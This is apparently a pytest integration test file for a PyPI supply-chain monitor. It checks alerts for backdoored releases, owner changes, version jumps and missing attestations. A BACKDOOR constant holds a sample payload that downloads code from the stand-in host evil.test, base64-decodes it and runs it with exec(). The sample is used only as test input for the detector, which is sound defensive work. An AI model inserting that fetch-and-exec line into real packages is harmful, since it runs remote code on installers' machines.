"""A pair of versions through the whole pipeline, against a real PostgreSQL."""

import hashlib
import io
import json
import tarfile
import zipfile
from collections.abc import AsyncIterator
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import httpx
import pytest
from sqlalchemy import select, update

from pypi_monitor.analyzers.consistency import ConsistencyAnalyzer
from pypi_monitor.analyzers.context import ContextAnalyzer
from pypi_monitor.analyzers.diff import DiffAnalyzer
from pypi_monitor.analyzers.provenance import ProvenanceAnalyzer
from pypi_monitor.db.models import Artifact, Package, Release, Verdict
from pypi_monitor.db.models import Signal as SignalRow
from pypi_monitor.db.session import Sessions
from pypi_monitor.domain import ReleaseStatus, Severity
from pypi_monitor.github import GitHubArchives
from pypi_monitor.ingest.store import record_added_file, record_release
from pypi_monitor.pipeline.queue import Stage
from pypi_monitor.pipeline.stages import Pipeline, _advance, _SupersededError
from pypi_monitor.pipeline.unpack import UnpackLimits
from pypi_monitor.pypi import PyPIClient
from pypi_monitor.pypi.client import FILES_HOST
from pypi_monitor.report import release_report
from pypi_monitor.scoring import load_scoring_config
from tests.conftest import FakeQueue, FakeStorage
from tests.test_pipeline import RecordingNotifier, sdist

LIMITS = UnpackLimits(max_bytes=10_000_000, max_files=1000, max_ratio=1000)
CLEAN = {"setup.py": "from setuptools import setup\nsetup()\n", "lib/__init__.py": "X = 1\n"}
BACKDOOR = (
    "import base64, urllib.request\n"
    'exec(base64.b64decode(urllib.request.urlopen("https://evil.test/p").read()))\n'
)
INFECTED = {**CLEAN, "lib/__init__.py": BACKDOOR + "X = 1\n"}
START = datetime(2026, 1, 1, tzinfo=UTC)


@dataclass
class Index:
    """Serves a project with several versions the way pypi.org does."""

    name: str
    uploads: dict[str, datetime] = field(default_factory=dict)
    archives: dict[str, bytes] = field(default_factory=dict)
    owners: list[str] = field(default_factory=lambda: ["alice"])
    repository: str | None = None
    downloads: list[str] = field(default_factory=list)
    # Trusted Publishers of versions uploaded with PEP 740 attestations.
    publishers: dict[str, dict[str, str]] = field(default_factory=dict)
    # Wheels of a version by file name, and files uploaded without attestations all the same.
    wheels: dict[str, dict[str, bytes]] = field(default_factory=dict)
    unattested: set[str] = field(default_factory=set)

    def publish(self, version: str, files: dict[str, str], upload: datetime = START) -> None:
        self.archives[version] = sdist(f"{self.name}-{version}", files)
        self.uploads[version] = upload

    def add_wheel(self, version: str, tag: str, files: dict[str, str]) -> str:
        filename = f"{self.name}-{version}-{tag}.whl"
        self.wheels.setdefault(version, {})[filename] = wheel(files)
        return filename

    def _file(self, version: str, filename: str | None = None) -> dict[str, Any]:
        if filename is None:
            filename = f"{self.name}-{version}.tar.gz"
            archive = self.archives[version]
        else:
            archive = self.wheels[version][filename]
        return {
            "filename": filename,
            "packagetype": "bdist_wheel" if filename.endswith(".whl") else "sdist",
            "size": len(archive),
            "url": f"https://{FILES_HOST}/{filename}",
            "digests": {"sha256": hashlib.sha256(archive).hexdigest()},
            "upload_time_iso_8601": self.uploads[version].isoformat(),
        }

    def _files(self, version: str) -> list[dict[str, Any]]:
        wheels = self.wheels.get(version, {})
        return [self._file(version)] + [self._file(version, name) for name in wheels]

    def _attested(self, version: str, filename: str) -> bool:
        return version in self.publishers and filename not in self.unattested

    def _simple(self) -> dict[str, Any]:
        return {
            "versions": list(self.archives),
            "files": [
                {
                    "filename": file["filename"],
                    "size": file["size"],
                    "url": file["url"],
                    "hashes": file["digests"],
                    "upload-time": file["upload_time_iso_8601"],
                    "yanked": False,
                    "provenance": (
                        f"https://pypi.org/integrity/{self.name}/{version}/{file['filename']}/provenance"
                        if self._attested(version, file["filename"])
                        else None
                    ),
                }
                for version in self.archives
                for file in self._files(version)
            ],
        }

    def handle(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if request.url.host == FILES_HOST:
            self.downloads.append(path)
            filename = path.removeprefix("/")
            for wheels in self.wheels.values():
                if filename in wheels:
                    return httpx.Response(200, content=wheels[filename])
            version = filename.removeprefix(f"{self.name}-").removesuffix(".tar.gz")
            return httpx.Response(200, content=self.archives[version])
        if path.startswith("/integrity/"):
            version, filename = path.split("/")[3:5]
            if not self._attested(version, filename):
                return httpx.Response(404)
            bundle = {"publisher": {**self.publishers[version], "claims": None}, "attestations": []}
            return httpx.Response(200, json={"version": 1, "attestation_bundles": [bundle]})
        if path == f"/simple/{self.name}/":
            assert "pypi.simple" in request.headers["accept"]
            return httpx.Response(200, json=self._simple())
        info: dict[str, Any] = {"name": self.name, "description": "x" * 200}
        if self.repository:
            info["project_urls"] = {"Source": f"https://github.com/{self.repository}"}
        data: dict[str, Any] = {
            "info": info,
            "ownership": {"roles": [{"role": "Owner", "user": u} for u in self.owners]},
            "last_serial": 1,
        }
        if path == f"/pypi/{self.name}/json":
            data["releases"] = {v: self._files(v) for v in self.archives}
        else:
            data["urls"] = self._files(path.split("/")[3])
        return httpx.Response(200, content=json.dumps(data))


def wheel(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for path, content in files.items():
            archive.writestr(path, content)
    return buffer.getvalue()


@dataclass
class World:
    index: Index
    pipeline: Pipeline
    sessions: Sessions
    queue: FakeQueue
    notifier: RecordingNotifier

    async def process(self, version: str) -> int:
        async with self.sessions.begin() as session:
            release_id = await record_release(session, self.index.name, version)
        assert release_id is not None
        self.queue.jobs.append((Stage.DOWNLOAD, release_id))
        while self.queue.jobs:
            stage, job = self.queue.jobs.pop(0)
            await getattr(self.pipeline, stage.value)(job)
        return release_id

    async def release(self, version: str) -> Release:
        async with self.sessions() as session:
            release = await session.scalar(select(Release).where(Release.version == version))
        assert release is not None
        return release

    async def rules(self) -> set[str]:
        async with self.sessions() as session:
            return set(await session.scalars(select(SignalRow.rule_id)))


@pytest.fixture
async def world(sessions: Sessions, queue: FakeQueue, storage: FakeStorage) -> AsyncIterator[World]:
    index = Index("lib")
    client = PyPIClient(httpx.MockTransport(index.handle))
    notifier = RecordingNotifier()
    pipeline = Pipeline(
        sessions=sessions,
        client=client,
        storage=storage,  # type: ignore[arg-type]
        queue=queue,
        notifier=notifier,
        scoring=load_scoring_config(Path("config/scoring.yaml")),
        analyzers=[DiffAnalyzer(), ConsistencyAnalyzer(), ContextAnalyzer(), ProvenanceAnalyzer()],
        limits=LIMITS,
        max_artifact_bytes=5_000_000,
        analyzer_timeout_s=60,
    )
    yield World(index, pipeline, sessions, queue, notifier)
    await client.aclose()


async def test_injected_backdoor_leads_to_an_alert(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", INFECTED, START + timedelta(days=1))

    release_id = await world.process("1.1")

    release = await world.release("1.1")
    baseline = await world.release("1.0")
    assert release.id == release_id
    assert release.prev_release_id == baseline.id
    assert release.status is ReleaseStatus.ALERTED
    assert release.pypi_metadata["previous_version"] == "1.0"
    assert baseline.status is ReleaseStatus.BASELINE
    assert world.notifier.alerts[0].level is Severity.CRITICAL
    assert world.notifier.alerts[0].signals[0].rule_id == "diff.exec_decoded"


async def test_ordinary_update_is_clean(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", {**CLEAN, "lib/new.py": "Y = 2\n"}, START + timedelta(days=1))

    await world.process("1.1")

    assert (await world.release("1.1")).status is ReleaseStatus.CLEAN
    assert world.notifier.alerts == []


async def test_first_version_has_no_baseline(world: World) -> None:
    world.index.publish("1.0", CLEAN)

    await world.process("1.0")

    assert (await world.release("1.0")).prev_release_id is None
    assert not {rule for rule in await world.rules() if rule.startswith("diff.")}


async def test_processed_previous_release_is_reused(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    await world.process("1.0")
    world.index.publish("1.1", {**CLEAN, "lib/new.py": "Y = 2\n"}, START + timedelta(days=1))
    world.index.downloads.clear()

    await world.process("1.1")

    first = await world.release("1.0")
    assert first.status is ReleaseStatus.CLEAN
    assert (await world.release("1.1")).prev_release_id == first.id
    assert world.index.downloads == ["/lib-1.1.tar.gz"]


async def test_baseline_artifacts_are_stored_once(world: World, storage: FakeStorage) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    world.index.publish("1.2", CLEAN, START + timedelta(days=2))

    await world.process("1.1")
    await world.process("1.2")

    assert "lib/1.0/lib-1.0.tar.gz" in storage.objects
    assert world.index.downloads.count("/lib-1.0.tar.gz") == 1
    async with world.sessions() as session:
        assert len(list(await session.scalars(select(Artifact)))) == 3


async def test_baseline_never_goes_through_the_stages(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    await world.process("1.1")
    baseline = await world.release("1.0")
    old = datetime.now(UTC) - timedelta(hours=1)
    async with world.sessions.begin() as session:
        await session.execute(update(Release).values(created_at=old))

    assert await world.pipeline.sweep(stale_after_s=60) == 0

    await world.pipeline.download(baseline.id)
    assert (await world.release("1.0")).status is ReleaseStatus.BASELINE


async def test_a_baseline_seen_in_the_stream_gets_analyzed(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    await world.process("1.1")

    await world.process("1.0")

    assert (await world.release("1.0")).status is ReleaseStatus.CLEAN


async def test_known_release_is_not_recorded_twice(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    await world.process("1.0")

    async with world.sessions.begin() as session:
        assert await record_release(session, "lib", "1.0") is None


async def test_owner_change_is_seen_only_against_our_own_snapshot(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    world.index.owners = ["mallory"]

    # 1.0 is a baseline here: PyPI would show today's owners for it, so nothing is known.
    await world.process("1.1")
    assert not {rule for rule in await world.rules() if rule.startswith("context.owner")}

    world.index.owners = ["eve"]
    world.index.publish("1.2", CLEAN, START + timedelta(days=2))
    await world.process("1.2")
    assert "context.owners_replaced" in await world.rules()


async def test_dormant_project_with_a_jump(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("7.0", CLEAN, START + timedelta(days=800))

    await world.process("7.0")

    assert {"context.dormant_release", "context.version_jump"} <= await world.rules()


async def test_report_shows_the_analysis(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("7.0", INFECTED, START + timedelta(days=800))
    await world.process("7.0")

    report = await release_report(world.sessions, "lib", "7.0")

    assert "lib 7.0: alerted" in report
    assert "compared with: 1.0" in report
    assert "owners: alice" in report
    assert "verdict: critical" in report
    assert "context.dormant_release" in report
    assert "diff.exec_decoded lib-7.0.tar.gz/lib-7.0/lib/__init__.py:2" in report
    assert await release_report(world.sessions, "lib", "9") == "lib 9 is not known"


async def make_popular(world: World) -> None:
    async with world.sessions.begin() as session:
        await session.execute(update(Package).values(is_popular=True))


async def test_popular_package_stays_in_the_priority_queue(world: World) -> None:
    world.index.publish("1.0", INFECTED)
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.0")
    assert release_id is not None
    await make_popular(world)

    await world.pipeline.download(release_id)
    await world.pipeline.analyze(release_id)
    await world.pipeline.score(release_id)

    assert world.queue.priority >= {(Stage.ANALYZE, release_id), (Stage.SCORE, release_id)}


async def test_ordinary_package_stays_in_the_usual_queue(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    await world.process("1.0")

    assert world.queue.priority == set()


async def test_sweep_keeps_the_priority(world: World) -> None:
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.0")
    await make_popular(world)

    await world.pipeline.sweep(stale_after_s=-60)

    assert (Stage.DOWNLOAD, release_id) in world.queue.priority


def tag_archive(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for path, content in files.items():
            data = content.encode()
            member = tarfile.TarInfo(f"repo-1.1/{path}")
            member.size = len(data)
            tar.addfile(member, io.BytesIO(data))
    return buffer.getvalue()


async def test_popular_package_is_compared_with_its_tag(world: World) -> None:
    world.index.repository = "org/repo"
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", INFECTED, START + timedelta(days=1))
    asked: list[str] = []

    def handle(request: httpx.Request) -> httpx.Response:
        asked.append(request.url.path)
        return httpx.Response(200, content=tag_archive(CLEAN))

    github = GitHubArchives(httpx.MockTransport(handle))
    world.pipeline._github = github
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.1")
    await make_popular(world)
    world.queue.jobs.append((Stage.DOWNLOAD, release_id))  # type: ignore[arg-type]
    while world.queue.jobs:
        stage, job = world.queue.jobs.pop(0)
        await getattr(world.pipeline, stage.value)(job)
    await github.aclose()

    assert asked == ["/org/repo/tar.gz/refs/tags/v1.1"]
    assert "consistency.tag_code_differs" in await world.rules()


async def test_ordinary_package_is_not_compared_with_its_tag(world: World) -> None:
    world.index.repository = "org/repo"
    world.index.publish("1.0", CLEAN)
    asked: list[str] = []

    def handle(request: httpx.Request) -> httpx.Response:
        asked.append(request.url.path)
        return httpx.Response(404)

    github = GitHubArchives(httpx.MockTransport(handle))
    world.pipeline._github = github

    await world.process("1.0")
    await github.aclose()

    assert asked == []


async def test_github_failure_does_not_stop_the_release(world: World) -> None:
    world.index.repository = "org/repo"
    world.index.publish("1.0", CLEAN)
    github = GitHubArchives(httpx.MockTransport(lambda _: httpx.Response(503)))
    world.pipeline._github = github
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.0")
    await make_popular(world)
    world.queue.jobs.append((Stage.DOWNLOAD, release_id))  # type: ignore[arg-type]
    while world.queue.jobs:
        stage, job = world.queue.jobs.pop(0)
        await getattr(world.pipeline, stage.value)(job)
    await github.aclose()

    assert (await world.release("1.0")).status is ReleaseStatus.CLEAN


PUBLISHER = {
    "kind": "GitHub",
    "repository": "acme/lib",
    "workflow": "release.yml",
    "environment": "",
}


async def test_a_release_without_the_attestations_of_its_predecessor(world: World) -> None:
    world.index.publishers["1.0"] = PUBLISHER
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))

    await world.process("1.1")

    snapshot = (await world.release("1.1")).pypi_metadata["provenance"]
    assert snapshot["previous_publisher"] == PUBLISHER
    assert snapshot["files"] == [
        {"filename": "lib-1.1.tar.gz", "packagetype": "sdist", "publisher": None}
    ]
    assert "provenance.attestations_dropped" in await world.rules()


async def test_a_release_from_another_repository(world: World) -> None:
    world.index.publishers["1.0"] = PUBLISHER
    world.index.publishers["1.1"] = {**PUBLISHER, "repository": "mallory/lib"}
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))

    await world.process("1.1")

    assert "provenance.publisher_changed" in await world.rules()


async def test_without_attestations_before_provenance_is_not_asked(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))

    await world.process("1.1")

    assert (await world.release("1.1")).pypi_metadata["provenance"] is None
    assert not {rule for rule in await world.rules() if rule.startswith("provenance.")}


LINUX = "cp313-cp313-manylinux_2_28_x86_64"
WINDOWS = "cp313-cp313-win_amd64"
WHEEL_CLEAN = {"lib/__init__.py": "X = 1\n", "lib/_core.py": "def f():\n    return 1\n"}
WHEEL_INFECTED = {**WHEEL_CLEAN, "lib/__init__.py": BACKDOOR + "X = 1\n"}


async def signals_by_rule(world: World) -> dict[str, list[SignalRow]]:
    found: dict[str, list[SignalRow]] = {}
    async with world.sessions() as session:
        for row in await session.scalars(select(SignalRow)):
            found.setdefault(row.rule_id, []).append(row)
    return found


async def test_a_payload_in_the_wheel_of_one_platform_only(world: World) -> None:
    for version, day, windows in (("1.0", 0, WHEEL_CLEAN), ("1.1", 1, WHEEL_INFECTED)):
        world.index.publish(version, CLEAN, START + timedelta(days=day))
        world.index.add_wheel(version, LINUX, WHEEL_CLEAN)
        world.index.add_wheel(version, WINDOWS, windows)

    await world.process("1.1")

    assert (await world.release("1.1")).status is ReleaseStatus.ALERTED
    found = await signals_by_rule(world)
    paths = {row.file_path for row in found["diff.exec_decoded"]}
    assert paths == {f"lib-1.1-{WINDOWS}.whl/lib/__init__.py"}
    # The code that both wheels share is read once.
    assert not {path for rows in found.values() for row in rows if (path := row.file_path)} & {
        f"lib-1.1-{WINDOWS}.whl/lib/_core.py"
    }


async def test_identical_platform_wheels_say_nothing_new(world: World) -> None:
    for version, day in (("1.0", 0), ("1.1", 1)):
        world.index.publish(version, CLEAN, START + timedelta(days=day))
        world.index.add_wheel(version, LINUX, WHEEL_CLEAN)
        world.index.add_wheel(version, WINDOWS, {**WHEEL_CLEAN, "lib/_win.py": "import ctypes\n"})

    await world.process("1.1")

    assert (await world.release("1.1")).status is ReleaseStatus.CLEAN
    # The Windows module is compared with the Windows wheel of 1.0, not called new.
    assert "diff.file.new_python" not in await world.rules()


async def test_a_wheel_added_after_the_verdict_is_analyzed_again(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.add_wheel("1.0", LINUX, WHEEL_CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    world.index.add_wheel("1.1", LINUX, WHEEL_CLEAN)
    release_id = await world.process("1.1")
    assert (await world.release("1.1")).status is ReleaseStatus.CLEAN

    filename = world.index.add_wheel("1.1", WINDOWS, WHEEL_INFECTED)
    async with world.sessions.begin() as session:
        assert await record_added_file(session, "lib", "1.1", filename) == release_id
    world.queue.jobs.append((Stage.DOWNLOAD, release_id))
    while world.queue.jobs:
        stage, job = world.queue.jobs.pop(0)
        await getattr(world.pipeline, stage.value)(job)

    release = await world.release("1.1")
    assert release.status is ReleaseStatus.ALERTED
    assert release.revision == 1
    assert world.notifier.alerts[0].level is Severity.CRITICAL
    async with world.sessions() as session:
        verdicts = list(await session.scalars(select(Verdict).order_by(Verdict.id)))
    assert [(v.revision, v.level in (Severity.LOW, Severity.MEDIUM)) for v in verdicts] == [
        (0, True),
        (1, False),
    ]
    # The files that were there before are not downloaded again.
    assert world.index.downloads.count(f"/lib-1.1-{LINUX}.whl") == 1


async def test_an_alerted_release_does_not_alert_again_for_the_same_level(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", INFECTED, START + timedelta(days=1))
    release_id = await world.process("1.1")
    assert len(world.notifier.alerts) == 1

    filename = world.index.add_wheel("1.1", LINUX, WHEEL_CLEAN)
    async with world.sessions.begin() as session:
        assert await record_added_file(session, "lib", "1.1", filename) == release_id
    world.queue.jobs.append((Stage.DOWNLOAD, release_id))
    while world.queue.jobs:
        stage, job = world.queue.jobs.pop(0)
        await getattr(world.pipeline, stage.value)(job)

    assert (await world.release("1.1")).status is ReleaseStatus.ALERTED
    assert len(world.notifier.alerts) == 1


async def test_a_stage_of_an_old_revision_drops_its_results(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    release_id = await world.process("1.1")
    async with world.sessions.begin() as session:
        await session.execute(
            update(Release)
            .where(Release.id == release_id)
            .values(status=ReleaseStatus.ANALYZED, revision=3)
        )
    loaded = await world.release("1.1")
    async with world.sessions.begin() as session:
        # Meanwhile a file arrives and the release is queued under a newer revision.
        await session.execute(update(Release).where(Release.id == release_id).values(revision=4))

    async with world.sessions.begin() as session:
        with pytest.raises(_SupersededError):
            await _advance(session, loaded, status=ReleaseStatus.CLEAN)
    assert (await world.release("1.1")).status is ReleaseStatus.ANALYZED


async def test_a_wheel_uploaded_without_attestations_next_to_attested_ones(world: World) -> None:
    world.index.publishers["1.0"] = PUBLISHER
    world.index.publishers["1.1"] = PUBLISHER
    for version, day in (("1.0", 0), ("1.1", 1)):
        world.index.publish(version, CLEAN, START + timedelta(days=day))
        world.index.add_wheel(version, LINUX, WHEEL_CLEAN)
    world.index.unattested.add(world.index.add_wheel("1.1", WINDOWS, WHEEL_CLEAN))
    world.index.add_wheel("1.0", WINDOWS, WHEEL_CLEAN)

    await world.process("1.1")

    found = await signals_by_rule(world)
    assert [row.file_path for row in found["provenance.attestations_dropped"]] == [
        f"lib-1.1-{WINDOWS}.whl"
    ]
